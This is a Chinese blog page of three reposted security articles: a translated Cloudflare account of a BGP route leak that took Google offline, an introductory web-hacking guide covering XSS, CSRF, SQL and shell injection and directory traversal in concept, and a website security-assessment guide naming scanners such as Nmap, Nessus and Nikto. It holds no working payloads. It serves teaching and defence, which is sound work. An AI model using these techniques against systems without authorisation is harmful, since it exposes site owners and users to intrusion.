<p>边缘网关协议是基于一个相互信任的体制。各个网络基于信任的原则告诉其它网络哪个IP地址属于哪个网络。当你发送一个数据包，或发送一个穿越网络的请求，你的网络服务提供商会联系它的上游提供商或对等提供商，询问它们从你的网络服务提供商到网络目的地，哪条路线最近。</p>
<p>不幸的是，如果当一个网络发出声明说某个IP地址或某个网络在它的内部，而事实不是这样，如果它的上游网络或对等网络信任了它，那么，这个数据包最终将会迷路丢失。这里发生的就是这个问题。</p>
<p>我查看了边缘网关协议传递的谷歌IP的路由地址，路由指向了Moratel (23947)，一个印度尼西亚的网络服务提供商。我们的办公室在加利福尼亚，离谷歌的数据中心并不远，数据包绝不应该经过印度尼西亚。很有可能是，Moratel声明了一个错误的网络路由。</p>
<p>当时我看到的边缘网关协议发来的路由是：
p&gt;tom@edge01.sfo01&gt; show route 216.239.34.10</p>
<p>inet.0: 422168 destinations, 422168 routes (422154 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>216.239.34.0/24 /*[BGP/170] 00:15:47, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>我查看了其它路由，比如谷歌的公共DNS，它同样被劫持到了相同的(不正确的)路径：</p>
<p>inet.0: 422196 destinations, 422196 routes (422182 active, 0 holddown, 14 hidden)</p>
<ul>
<li>= Active Route, - = Last Active, /* = Both</li>
</ul>
<p>8.8.8.0/24 /*[BGP/170] 00:27:02, MED 18, localpref 100</p>
<p>AS path: 4436 3491 23947 15169 I</p>
<blockquote>
<p>to 69.22.153.1 via ge-1/0/9.0</p>
</blockquote>
<p>tom@edge01.sfo01&gt; show route 8.8.8.8</p>
<p><strong>路由泄漏</strong></p>
<p>像这样的问题在行业内被认为是起源于“路由泄漏”，不是正常的，而是“泄漏”出来的路由。这种事情并不是没有先例。谷歌之前曾遭受过类似的宕机事件，当时推测是巴基斯坦为了禁止YouTube上的一个视频，巴基斯坦国家ISP删除了YouTube网站的路由信息。不幸的是，他们的这种做法被传递到了外部，巴基斯坦电信公司的上游提供商——电讯盈科(PCCW)信任了巴基斯坦电信公司的做法，把这种路由方式传递到了整个互联网。这个事件导致了YouTube网站大约2个小时不能访问。</p>
<p><img src="&quot;胖手指 辛普森&quot;" alt="胖手指 辛普森"></p>
<p>今天发生的事情属于类似情况。在Moratel公司的某个人很可能是“胖手指”，输错了互联网路由。而电讯盈科，Moratel公司的上游提供商，信任了Moratel公司传递给他们的路由。很快，这错误的路由就传到了整个互联网。在边缘网关协议这种信任模式中，与其说这是恶意的行为，不如说这是误操作或失误。</p>
<p><strong>修复</strong></p>
<p>解决方案就是让Moratel公司停止声明错误的路由。作为一个网络工程师，尤其是像CloudFlare这样的大网络公司里工作的工程师，很大一部分工作就是和其它世界各地的网络工程师保持联络。当探明问题后，我联系到了Moratel公司的一位同事，告诉他发生了什么事。他大概在太平洋标准时间下午6：50分/世界标准时间凌晨2：50分修复了这个问题。3分钟后，路由恢复了正常，谷歌的服务重新可以工作了。</p>
<p>从网络传输图上观察，我估计全球整个互联网用户的3-5%收到了此次宕机事故的影响。重灾区是香港，因为那是电讯盈科的总部。如果你所处的地区在当时无法访问谷歌的服务，你现在应该知道是什么原因了。</p>
<p><strong>构建更好的互联网</strong></p>
<p>我说这些就是想让大家知道我们的互联网上如何在一个相互信任的机制下建立起来的。今天的事故说明，即使你是一个像谷歌这样的大公司，外部你无法掌控的因素也会影响到你的用户，让他们无法访问你，所以，一个网络技术小组是非常必要的，由他们来监控路由，管理你与世界的联系。CloudFlare公司每天的工作就是确保客户得到最佳的路由。我们照看互联网上的所有网站，确保他们的以最快传输速度提供服务。今天的事情只是我们工作内容的一个小片段。</p>
<p>译文出自：<a href="http://www.aqee.net/why-google-went-offline-today-and-a-bit-about-how-the-internet-works/" target="_blank">外刊IT评论</a></p>
<p>英文出自：<a href="http://blog.cloudflare.com/why-google-went-offline-today-and-a-bit-about" target="_blank">Cloudflare</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 20:50:56"datetime="2014-03-29 20:50:56"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--从谷歌宕机事件认识互联网工作原理-CSDNNET" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">成为一个破坏者的第一部分：Web安全</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-web-">成为一个破坏者的第一部分：Web安全</h1>
<h2 id="-web-">成为一个破坏者的第一部分：Web安全</h2>
<p>在我看来，没有什么比挑战安全领域更有挑战性。当强大的软件一个接一个接踵而至，你所需要做的就是破解他，这好比是一场围棋游戏。当你每下一步棋，你的对手——软件的设计者和开发者，通过代理——作出相应的回应。正如你所知的，赢的途径只有一条，你将会利用大脑的每一部分，找出链条中的弱点。</p>
<p>当我找到正确的击破点，并且整个系统崩溃的时候，我觉得我找到了自己。你也会的。</p>
<h2 id="-">序言</h2>
<p>这篇博客的目的并不是要全面地去讨论；实际上，它是相反的。我的目的是教会你关于安全上足够的东西——尤其是软件安全——你可以自己去深入学习其他东西。为了轻松去学习，我会在通篇博客中放置各种资源的链接；在这里，Google也是你最好的朋友，它在这个主题上有上百万的资源。</p>
<p>在你读了正文部分后，你可以跳去其他的你认为合适的任何部分（包括其他由之而来的博客），因为它们是独立编写的。</p>
<p>这篇博客主要关注Web安全。对于底层安全和加密的博客即将发布。</p>
<h2 id="-">正文</h2>
<h3 id="-">预备知识</h3>
<p>要想出一些安全领域的预备知识是比较难的，这知识由于这领域的涉及面太广。然而，下面的东西还是必需要有的：</p>
<ul>
<li>熟悉一种或多种编程语言（没有人会让你用你不会的语言来写小说）。如果你感兴趣的是底层的安全，那就必需要会一种底层语言；C是最好的。</li>
<li><p>了解计算机的原理和它是怎样工作的。不要求你能够用铁罐和线组装层一个CPU，但你要能够解析：</p>
</li>
<li><p>(Web) HTML是怎样转换的以及JS是怎样在页面上交互的。</p>
</li>
<li><p>(Web) HTTP协议是怎样工作的。</p>
</li>
<li><p>实际上，写一个代理。你最后就做了很多这些东西。（这实际上是足够重要的，某天我可能会写一个关于这个的博客。）</p>
</li>
<li>(底层) 指针是怎样工作的，栈是怎样布局的，堆是什么东西，以及（附加要点）系统调用是怎样工作的。</li>
</ul>
<p>在需要的地方，我会讲下更多的特殊预备知识。</p>
<h2 id="-">心态</h2>
<p>在我继续之前，我需要触摸一下破坏者的心态。你的目标并不是保存用户交互，或是程序的数据流。你的目标是回答一个简单的问题：在什么情况下，程序无法完成其既定目标？</p>
<p>或许对此最好的例子就是网络应用中存在的跨站脚本攻击；攻击者可以在页面之外输出未经过滤的内容，允许其在页面中插入任意的HTML代码。正常的数据流存留——从用户到页面的数据——但由于数据中含有HTML代码，页面被完全损坏了》</p>
<p>预期和实际行为的区别在于你对所有可能性的探寻——无论是下节中描述的标准bug，还是你正测试的问题域的特有逻辑缺陷。</p>
<h2 id="-">网络安全</h2>
<h3 id="-">必用工具</h3>
<p>下面是一个你的兵器库中必备工具的列表。其中一些是很多工具的集合——除非特别提及，它们大多是可以相互替换的。</p>
<ul>
<li><p>HTTP(S) 代理——你会经常用到，它将允许你在传输过程中分行和修改数据。</p>
</li>
<li><p><a href="http://portswigger.net/burp/proxy.html" target="_blank">Burp 代理</a>——除非有理由，否则你值得拥有。这是业内标准，学习曲线很浅。</p>
</li>
<li><a href="http://mitmproxy.org/" target="_blank">mitmproxy</a></li>
<li><a href="http://www.charlesproxy.com/" target="_blank">Charles 代理</a> (界面非常糟糕，只在对 <a href="http://en.wikipedia.org/wiki/Action_Message_Format" target="_blank">AMF</a> 时使用它。)</li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank">DirBuster</a> —— 对查找“隐藏”的文件/目录很有用。</li>
<li><a href="https://github.com/GDSSecurity/PadBuster" target="_blank">PadBuster</a> —— 侦查填充溢出漏洞很有用。</li>
<li><a href="http://python.org/" target="_blank">Python</a> or <a href="http://ruby-lang.org/" target="_blank">Ruby</a> —— 对任务进行自动化处理。</li>
</ul>
<h2 id="-"> </h2>
<h2 id="-xss-">跨站脚本漏洞（XSS）</h2>
<p>跨站脚本是网站最常见的漏洞。这个概念很简单：攻击者的数据发送到页面没有经过合适的过滤，使攻击者的代码可以在页面上下文内执行。</p>
<p>反射XSS（Reflected XSS）是攻击者的注入（比如查询字符串）后页面直接显示攻击结果。这是最常用的也是使用最多的CSRF攻击方式（见下一节）。他们可以被许多现代Web框架默认防御掉。</p>
<p>存储XSS（Stored XSS）是攻击者把数据注入到存储单元中——一般是数据库——在此后的某个时段无过滤的输出结果。这种XSS没有反射XSS普遍，但是杀伤力更大，因为很容易影响到大量用户。和反射XSS一样，许多框架默认也可以防御。</p>
<p>基于DOM的XSS（DOM-based XSS）是注入到JavaScript中，浏览器无过滤的输出结果。这种XSS相当罕见但是无法被框架防御。因而相对别的XSS形式，基于DOM的XSS在逐渐增多。</p>
<p>在所有情况下，他们都可以被输出前的数据过滤阻止，但重要的是正确地编码数据。例如HTML编码没办法防御数据中script标签中的代码；这样JS字符串也需要编码。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A2-Cross-Site_Scripting_%28XSS%29" target="_blank">OWASP</a> (The Open Web Application Security Project)</li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank">Wikipedia</a><h2 id="-csrf-">跨站请求伪造（CSRF）</h2>
</li>
</ul>
<p>CSRF攻击很简单，但很常见很有效。基本的原理是攻击者把受害者引导（重定向或Email中的链接）到目标网站上。这个页面带有执行请求的数据，比如银行事务。从后端看，就像是用户自己做的一个正常的请求。</p>
<p>防御CSRF的方法是在表单数据中加入随机令牌（token）。每次请求后端都验证token，确定用户会话token和表单数据token相同，否则拒绝请求。尽管主流框架都内置CSRF防御，但CSRF仍然是常见的攻击方式。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A5" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="sql-">SQL注入</h2>
<p>SQL注入是目前Web应用中最著名最普遍的漏洞。它是利用SQL查询时没有合适的转义，攻击者可以阻断原有查询并添加自己的查询代码。</p>
<p>根据代码和数据库配置情况，他可以造成从较大（盲注入查询数据）到在灾难级（任意代码执行，文件访问权限和数据破坏等）的破坏。主流的框架使用自带的ORM防御SQL注入：所有都用预备参数查询。当原生查询和攻击数据混合时，必须进行合适的转义。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A1" target="_blank">OWASP</a></li>
<li><a href="http://en.wikipedia.org/wiki/SQL_injection" target="_blank">Wikipedia</a><h2 id="shell-">Shell注入</h2>
</li>
</ul>
<p>Shell注入非常罕见，但非常严重。如果用户无过滤的传递shell命令，有可能——通过引号，分号或其他符号——同时执行其他命令。</p>
<p>使用用户数据调用shell命令最好把命令打包数组里（这是自然免疫）提供给程序，而且对原始命令字符串拼接的命令恰当的转义。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Code_injection#Shell_injection" target="_blank">Wikipedia</a></li>
</ul>
<h2 id="-">目录遍历</h2>
<p>目录遍历通常用于将用户信息直接指向系统中文件路径的情形。这样，如果没有适当的过滤，可能插入一个 “..” 目录的引用，就可以查阅目录树。它可能允许任意的读/写/删除文件操作，这是一个非常常见的漏洞。</p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Directory_traversal_attack" target="_blank">Wikipedia</a><h2 id="-">授权不足</h2>
</li>
</ul>
<p>授权不足 指的是某些功能或数据没有设定访问控制的情形。有个例子，一个正确设定访问控制的管理控制台有一个对有管理员身份需求的功能的链接，而此功能本身并未正确的设置访问控制。</p>
<p>这通常用于强制浏览攻击，以非法控制数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A8" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">强制浏览</h2>
<p>强制浏览——又叫 直接对象引用——是一种嫁给你实现细节以可修改的方式暴露给用户的漏洞类型。通常，它的形式是在请求中出现一个可以很容易修改的 id 参数，使攻击者可以轻易的列举出可能的标识符，以访问和修改数据。</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A4" target="_blank">OWASP</a></li>
</ul>
<h2 id="-">其它</h2>
<p>上面的话题是一个很好的开始，它们是我在测试现实世界中的应用时，<em>不断</em>出现的东西。当然，我给出的列表并不全面，所以下面列出了一些其它的主题，你应该读一下：</p>
<ul>
<li><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank">XML外部实体注入 (XXE)</a></li>
<li><a href="http://en.wikipedia.org/wiki/Session_fixation" target="_blank">Session 固化</a></li>
<li><a href="https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards" target="_blank">无校验重定向</a><h2 id="-">联系</h2>
</li>
</ul>
<p>处于对 <a href="http://www.overthewire.org/wargames/natas/" target="_blank">Natas</a> 网络安全的兴趣，我在近期指点了很多人。在这网络游戏中，你将使用到很多我在本文中提到过得技术，还有一些技术我并没有提及。它们也很有趣。</p>
<p>其它优质资源：</p>
<ul>
<li><a href="https://github.com/stripe-ctf/stripe-ctf-2.0/" target="_blank">Stripe CTF 2.0</a></li>
<li>OWASP&#39;s <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" target="_blank">WebGoat</a> and <a href="https://www.owasp.org/index.php/Category:OWASP_Vicnum_Project" target="_blank">Vicnum</a></li>
<li>Maven&#39;s <a href="http://www.mavensecurity.com/web_security_dojo/" target="_blank">Web Security Dojo</a></li>
<li><a href="http://peruggia.sourceforge.net/" target="_blank">Peruggia</a></li>
</ul>
<h2 id="-">深入学习</h2>
<p>希望完成练习并深入到实际应用中去？现在，很多公司都有 Bug 奖励系统，这样你不仅可以合法的测试它们的软件，同时还可以由自己发现的 Bug 获取报酬。你可以在 <a href="http://blog.bugcrowd.com/list-of-active-bug-bounty-programs/" target="_blank">这里</a>找到这些软件的列表。
Happy hacking,</p>
<p>时间:2013-03-19 08:47来源:开源中国社区 作者:oschina责任编辑:陈华才</p>
<p>来源： <a href="[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)">[http://www.linuxeden.com/html/news/20130319/137120.html](http://www.linuxeden.com/html/news/20130319/137120.html)</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--成为一个破坏者的第一部分：Web安全/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--成为一个破坏者的第一部分：Web安全" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--防范网页挂马攻击从对WEB站点进行安全评估开始/">防范网页挂马攻击 从对WEB站点进行安全评估开始</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全--防范网页挂马攻击从对WEB站点进行安全评估开始/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-web-">防范网页挂马攻击 从对WEB站点进行安全评估开始</h1>
<p>防范网页挂马攻击 从对WEB站点进行安全评估开始</p>
<p>原文链接：<a href="http://www.securitycn.net/html/research/service/5723.html" target="_blank"><a href="http://www.securitycn.net/html/research/service/5723.html">http://www.securitycn.net/html/research/service/5723.html</a></a></p>
<p>对于一些大型网站来说，通常拥有一整套已经执行了的WEB站点安全防范解决方案，但是，为什么一些网站还是会被攻击者挂载木马?其中一个最主要的原因是已经实施的WEB站点安全解决方案只能够应对已经出现的安全漏洞和威胁。而攻击者总是在通过各种手段来分析网站中可能会存在的弱点或漏洞，以便能够成功绕过网站当前的安全防范措施来实施挂马攻击。针对这样的一种WEB站点安全现状，最好的方式就是在部署相应的安全防范安全解决方案的同时，还必需采取与攻击者相同的手段，也就是在网站的运营过程中，不断对它进行安全评估，以此来找到网站中可能存在的弱点和漏洞。</p>
<p>对WEB站点进行安全评估是WEB安全防范处理过程中非常重要的一个环节，它应当贯穿站点的整个生命周期。对WEB站点实施安全评估的目的就是指安全评估人员，使用相应的评估工具和技术，经过一系列恰当的方法，对WEB服务器本身、服务器系统、后台数据库系统及网络中已经实施的安全机制，进行全面的检测和评估，以此来检测整个WEB系统是否还存在弱点，以及验证实施的安全机制是否有效。并根据最后的评估分析结果，对现有的安全策略进行修订，对实施的安全机制进行补充。</p>
<p>一、制定WEB站点安全评估方案</p>
<p>对WEB站点进行安全评估，为了能够达到最终的效果，事先先制定一个切合实际的安全评估方案是十分有意义的。当然，对于一些个人网站，或者只进行一次WEB站点弱点检测来说，也可以跳过制定安全评估方案这个环节，直接使用系统或WEB弱点检测工具对WEB站点所在的系统和其本身进行详细的弱点检测即可。</p>
<p>如果需要对一个WEB站点进行全面的安全评估，或者你需要一个安全评估方案来指导你完成相应的WEB站点弱点检测任务，那么，我们可以按下列列出的内容，来构建一个适合自己实际需求的WEB站点安全评估方案：</p>
<p>1、为WEB站点安全评估确定一个最终目标，也就是为什么要这么做，这样做需要达到什么的目的。</p>
<p>2、为WEB站点的安全评估指定安全评估人员。</p>
<p>3、确定安全评估时具体的评估对象。</p>
<p>4、为WEB站点的安全评估制定具体的时间计划表，如果没有什么特殊情况，我们应当严格按照这张时间表规定的时间对WEB站点实施安全评估。</p>
<p>5、为WEB站点的安全评估指定具体的评估工具，并要求评估人员对这些工具进行相应的学习，以达到训练掌握它们的目的，还必需规定评估人员按时对这些评估软件所依赖的评估漏洞库和软件本身进行不断的更新。</p>
<p>6、规定是将安全评估工具安全装在目标WEB服务器进行安全评估，还是在专门的硬件设备(例如笔记本电脑)上安装评估软件，然后在使用时再接入目标网络实施评估任务。</p>
<p>7、明确具体的安全评估方法</p>
<p>8、明确安全评估过程中需要注意的操作事项;</p>
<p>9、明确安全评估的规章制度和评估人员责任;</p>
<p>10、规定安全评估结果的记录方式，以及评估报告的上报、存档和检索方式。</p>
<p>WEB站点安全评估方案应当根据实际的网络环境，以及站点的具体内容和功能，经过详细的调查和分析后，再由安全评估参与人员共同完成。当然，一个实际的WEB站点安全评估方案，所包括的内容可能比上述所列出的内容要多得多，也详细得多，在这里只是对它们做了一个简单的说明，具体的内容还需要大家根据实际情况做具体的补充。</p>
<p>二、WEB站点安全评估的具体实施方式</p>
<p>WEB站点安全评估的具体实施涉及到四个最关键的因素，它们是安全评估人员、评估工具、评估方法和评估对象。</p>
<p>1、安全评估人员</p>
<p>安全评估人员，应当包括WEB站点所有者、管理员及安全评估实施人员。安全评估实施人员的技术和经验，以及工作态度在一定程度上决定了评估的效果和可信性。</p>
<p>有时，一些WEB站点不得不将安全评估任务外包给一些具有安全评估资质的第三方机构来完成，这也是一些没有具体的WEB站点管理员的中小企业WEB网站经常使用的方式。</p>
<p>还有一些WEB站点，所有的工作都是由站点管理员一个人来完成，对于这样的WEB站点安全评估报告，通常只会被他自己所接受，也就是用来对站点当前的安全状况进行一次简单的体检，以此来做到心中有数。</p>
<p>2、安全评估工具</p>
<p>安全评估工具需要根据所要评估的具体对象来选择，不同的评估对象，所使用的评估工具是不相同的。这是由于有些安全评估工具只是针对某种服务或软件，有些是针对整个主机或网络的;有些安全评估工具只能在某种操作系统平台下运行，而有些安全评估工具却能在许多流行的操作系统平台下运行;一些安全评估工具是软件方式的，还有一些是以独立的硬件方式存的;有些安全软件是免费的，而有一些是商业的。由此，要找到一款合适的安全评估工具还真的不是随便选择几样这么简单。并且，一些其他人认为非常好用的安全评估工具，对于我们自己来说并不见得会很喜欢，因此，有时我们不得不经过不断的试用才会知道哪几款评估软件才是最适合我们自己的。</p>
<p>幸运的是，现在还是已经有许多功能强大的评估工具可以供我们选择，这些工具有：</p>
<p>(1)Nmap</p>
<p>Nmap是一个网络探测和安全扫描程序，我们可以使用它来扫描WEB站点所在系统或整个网络，并以此来得到WEB站点所在系统正在运行及提供什么样的服务，开放了什么样的端口，使用什么样的操作系统等信息。Nmap支持包括UDP、TCP connect()、TCP SYN()、ICMP、FIN及ACK等扫描方式，其中有许多扫描方式还可以用来检测防火墙及IDS/IPS等设备的回应情况。</p>
<p>Nmap能够在类UNIX系统及Windows系统的终端下以命令方式运行，它的命令执行格式为：nmap [Scan Type(s)] [Options]。我们可以从<a href="http://insecure.org/网站上下载到它的最新版本，以及得到它的详细说明文档。" target="_blank">http://insecure.org/网站上下载到它的最新版本，以及得到它的详细说明文档。</a></p>
<p><img src="http://www.securitycn.net/img/uploadimg/20090504/1720010.jpg" alt="Nmap扫描结果示意图"></p>
<p>图1 Nmap扫描结果示意图</p>
<p>(2)Nessus</p>
<p>Nessus同样是一个功能强大的安全检测工具，它允许用户使用插件对它进行功能上的扩展。Nessus使用一个频繁更新的漏洞库作为安全检测的依据。我们可以到www.nessus.org网站上下载到它的免费版本Nessus3，以及得到它的详细的使用文档。现在大部分的安全人员都使用它来对网络或主机系统进行全面安全检测。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20090504/1720011.jpg" alt="Nessus3主界面"></p>
<p>图2 Nessus3主界面</p>
<p>(3)Nikto</p>
<p>Nikto是一款开放源代码、功能强大的WEB弱点扫描评估软件，它能对WEB服务器的多种安全项目进行测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto使用LibWhiske漏洞库，Nikto已成为WEB站点管理员必备的WEB安全检测工具之一。</p>
<p>可以到<a href="http://www.cirt.net/" target="_blank">http://www.cirt.net/</a> 网站上下载Nikto的最新版本。Nikto是基于PERL开发的程序，所以需要PERL环境。因此，当Nikto需要在Windows系统下使用时，要同时下载并安装ActiveState Perl环境。当需要Nikto使用SSL的安全方式对WEB站点进行安全扫描时，还会用到Net::SSLeay PERL模式，此时必须保证系统中安装有OpenSSL。它们的具体安装和使用细节可以参考它们的帮助文档。</p>
<p>另外，还有一个与Nikto相似的WEB弱点扫描工具Wikto，它不仅具有Nikto同样的功能，还提供GUI图形界面，但只能在Windows系统下运行。它可以到<a href="http://www.sensepost.com/research/wikto/下载。。" target="_blank">http://www.sensepost.com/research/wikto/下载。。</a></p>
<p>(4)N-Stealth</p>
<p>N-Stealth是ZMT公司出品的一款商业的WEB站点安全扫描软件，同时也有可以免费使用的版本，只是功能没有商业版本的多，漏洞库也不支持自动更新。我们可以到www.nstalker.com网站上下载它的最新版本，它可以在win98/ME/2000/XP/2003系统下运行。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20090504/1720012.jpg" alt="N-Stealth启动后的主界面"></p>
<p>图3 N-Stealth启动后的主界面</p>
<p>(5)ISS Database Scanner</p>
<p>ISS的数据库扫描器(DataBase Scanner)是一个针对数据库管理系统进行风险评估的检测工具。它可以自动识别数据库系统中各种潜在的安全问题，产生通俗易懂的报告来表示安全风险和弱点，并对违反和不遵循数据库安全策略的弱点和漏洞提出修改建议。</p>
<p>Database Scanner 可以扫描的数据包括Microsoft SOL Server 6.x 或7.x、Sybase Adaptive Server 11.x和Oracle 8i, 8.0 或 7.3。它能通过网络快速、方便地扫描数据库，去检查数据库中可能存在的安全漏洞，全面评估所有的安全漏洞和认证、授权、完整性方面的问题。</p>
<p><img src="http://www.securitycn.net/img/uploadimg/20090504/1720013.jpg" alt="Database Scanner的主界面"></p>
<p>图4 Database Scanner的主界面</p>
<p>除了上面介绍的安全扫描软件以外，还有一些软件也有可以用来进行安全检测工作，包括X-scan3.3、WebInject1.41和 Acunetix WVS Free Edition，以及一款功能全面且性能强大的商业安全扫描软件ISS Internet Scanner等。</p>
<p>另外，在使用任何评估工具之前，要先对其漏洞库进行升级更新。这是由于现在大多数安全评估工具都是利用漏洞特征库来进行弱点检测的，只有保证它们的漏洞特征库为最新状态，才有可能发现WEB站点及所依赖的系统上可能存在的最新漏洞。</p>
<p>3、安全评估方法</p>
<p>安全评估方法就是具体的安全评估实施方式，它主要涉及到下列五个具体的方面：</p>
<p>(1)由外向内测试</p>
<p>这种安全评估方式就是以攻击者的角度从WEB站点所在网络结构中的外部，对它进行安全扫描工作，以此来检测WEB站点防范来自互联网远程攻击的能力。此种测试方式可以使用上述评估工具中的N-stealth、X-Scan和WebInject等工具来进行。</p>
<p>(2)由内向外测试</p>
<p>由内向外的安全检测方式是指从WEB站点所在网络结构的内部，对它进行安全扫描工作。这种安全检测方式主要用来检验WEB站点对来自内部的攻击防范能力，以及检测对用户权限分配情况和内部数据传输过程中的安全性。此时可使用一些操作系统内部网络命令，例如Netstat，以及Hping和Nikto、X-scan、Nmap、Acunetix WVS Free Edition等工具来进行完成检测任务。</p>
<p>(3)模拟攻击测试</p>
<p>模拟攻击测试是指在实际的测试过程中并不对WEB站点所在服务器系统及WEB应用程序、网络设备进行真正的攻击事件。这种测试方式并不会对WEB站点的性能产生影响，平时大部分的安全评估工作应当使用模拟攻击的测试方式。</p>
<p>(4)真实攻击测试</p>
<p>当使用模拟攻击测试不能真正检验到网站的安全状况时，就可以使用真实的攻击测试。由于攻击是真实的，因此会对WEB站点的性能造成影响，因而这种方式最好在WEB开发的最初阶段，以及没有WEB业务的时候进行。现在有很多的网站都会请一些专门的黑客来对自己的站点进行真实的攻击，以便最大程度地检测出WEB站点中存在的安全漏洞问题。</p>
<p>(5)社会工程攻击测试</p>
<p>有许多人认为社会工程只是攻击者用来进行攻击的一种手段，却不知它也是一种很好的检测企业内部员工及站点管理员反社会工程攻击能力强度的评测工具。我们可以通过电话、手机短信及电子邮件的方式对评测的人员实施与攻击相同的社会工程攻击测试。同样，我们还可以通过直接接触的方式对被评测者进行相应的社会工程攻击测试评估。当我们决定进行社会工程方式的安全评估工作时，最好让可信的第三方来进行，这样才可以达到最好的评估效果。</p>
<p>4、评估对象</p>
<p>评估对象就是指评估过程中具体的评估实施目标，包括WEB服务器主机操作系统、WEB应用程序框架、数据库系统及网络基础设施等。</p>
<p>这四个因素是WEB站点安全评估工作中缺一不可的，缺少任何一个或任何一个出现问题，都会使整个评估工作中断或使评估结果不可信。还有就是评估工具的使用并不一定得一次只使用一种工具，我们可以根据所要评估的对象和评估的内容进行组合应用。毕竟，有时一种工具只在某一个方面比较有效，而且，评估软件还存在误报和漏报的问题，组合使用工具，再加上评估人员自己经验的判断，就能将评估结果的有效性提高到最高水平。</p>
<p>当WEB站点安全评估工作完成后，我们还应当根据安全评估结果，对安全策略进行相应的修订，同时对实施了的安全机制进行相应的补充。WEB站点的安全评估工作，在站点没有真正投入运行前，可不断地重复进行检测，直到我们认为已经修补了所有已知的漏洞为止。同时，我们还必需在WEB站点运营过程当中进行安全评估，以此来发现潜在的安全威胁。</p>
<p>不能忽略的一点，如今攻击者善于主动分析并发现新的漏洞，这样就对现有的漏洞扫面系统造成了一定的瓶颈，并不能完全解决网站被挂马攻击这种威胁。因此，我们在使用它的同时，还必需使用其它的方式来补充它的不足。</p>
<p>因此作为Web站点的管理者而言，需要通过不断对WEB站点进行安全评估，以便能先攻击者一步来发现网站中可能存在的弱点，然后才能在攻击没有发动前就修补好这些漏洞，这样才有可能最大限度地减少网站被挂马的风险。为了更好地了解安全趋势，我们还可以到www.cert.org及www.securityfocus.com订阅最新的安全漏洞的邮件列表，让我们可以及时了解每天的安全漏洞信息。</p>
<p>本篇文章来源于 中国安全网-安全您的网络 原文链接：<a href="http://www.securitycn.net/html/research/service/5723.html" target="_blank">http://www.securitycn.net/html/research/service/5723.html</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 20:55:56"datetime="2014-03-29 20:55:56"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--防范网页挂马攻击从对WEB站点进行安全评估开始/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--防范网页挂马攻击从对WEB站点进行安全评估开始" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
